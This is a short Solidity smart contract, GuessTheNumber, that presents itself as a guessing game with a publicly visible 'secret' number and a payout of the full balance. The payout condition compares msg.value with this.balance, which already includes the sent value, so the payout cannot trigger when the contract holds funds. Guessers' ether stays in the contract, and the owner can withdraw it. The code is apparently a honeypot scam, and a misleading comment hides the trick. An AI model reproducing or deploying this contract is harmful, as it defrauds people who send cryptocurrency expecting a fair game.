1 pragma solidity ^0.4.19;
2 contract GuessTheNumber {
3 
4     address private Owner = msg.sender;
5     uint public SecretNumber = 24;
6 
7     function() public payable {}
8    
9     function Withdraw() public {
10         require(msg.sender == Owner);
11         Owner.transfer(this.balance);
12     }
13     
14     function Guess(uint n) public payable {
15         if(msg.value >= this.balance && n == SecretNumber && msg.value > 0.25 ether) {
16             // Previous Guesses makes the number easier to guess so you have to pay more
17             msg.sender.transfer(this.balance+msg.value);
18         }
19     }
20 }